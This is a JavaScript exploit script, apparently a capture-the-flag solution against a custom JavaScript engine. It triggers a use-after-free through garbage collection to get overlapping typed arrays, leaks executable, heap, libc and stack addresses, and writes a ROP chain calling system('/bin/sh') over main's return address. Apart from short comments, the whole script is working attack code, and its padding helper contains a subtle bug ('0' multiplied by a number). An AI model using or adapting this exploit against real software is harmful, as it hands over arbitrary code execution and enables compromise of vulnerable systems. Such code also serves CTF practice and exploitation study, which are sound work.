// helpers
function set64(idx, val, where) {
  if (where === undefined) where = arr
  hex = val.toString(16);
  hex = '0' * (16 - hex.length) + hex;
  lower = parseInt(hex.slice(-8), 16);
  higher = parseInt(hex.slice(0, -8), 16);
  where.set(idx, lower);
  where.set(idx + 1, higher);
}

function read_ptr_idx(arr, idx) {
  return parseInt(arr.get(idx + 1).toString(16) + arr.get(idx).toString(16), 16);
}

// Exploit
function gc(buf) {
  for (i = 0; i < 10000; i++) {
    new Uint32Array(2);
  }
  // on exit to this function, this will be freed
  // but we yet have reference to same "u.ta.mem"
  new Uint32Array(buf);
}

buf = new ArrayBuffer(0x64);
arr = new Uint32Array(buf);
gc(buf);
while (true) {
  target = new Uint32Array(200);
  // if "arr.get(0) != 0", target are allocated in same "arr" slab
  if (arr.get(0) != 0) {
    print("found overlap!");
    break;
  }
}
// With this UAF, we can write a exploit with same strategy, but we can too try a ROP, no?
// example to making infinity OOB arr:
// set64(10, 1000); // target now have 1000 length

// mark to search in gdb
// arr.set(0, 0xdeadbeef);
exe_base = read_ptr_idx(arr, 2) - 0x440a0;
heap_leak = read_ptr_idx(arr, 6) - 0x6ae3f0;
__libc_start_main = exe_base + 0x43fd8;

// backup ptr to GC not crash after execution
original_ptr = read_ptr_idx(arr, 8);

set64(8, __libc_start_main);
libc_base = read_ptr_idx(target, 0) - 0x29dc0;
// one_gadget = libc_base + one_gadget;

environ = libc_base + 0x221200;
set64(8, environ);
stack_leak = read_ptr_idx(target, 0);
main_return = stack_leak - 296;
bin_sh = libc_base + 0x1d8698;
system = libc_base + 0x50d60;
pop_rdi = exe_base + 0x56ef;
rop = [pop_rdi, bin_sh, pop_rdi+1, system]

set64(8, main_return);
for (i = 0; i < rop.length*2; i+=2) {
  set64(i, rop[i/2], target);
}

print("elf base: 0x" + exe_base.toString(16));
print("heap base: 0x" + heap_leak.toString(16));
print("libc base: 0x" + libc_base.toString(16));
print("main_return: 0x" + main_return.toString(16));

// restore original ptr to GC not crash on exit
set64(8, original_ptr);
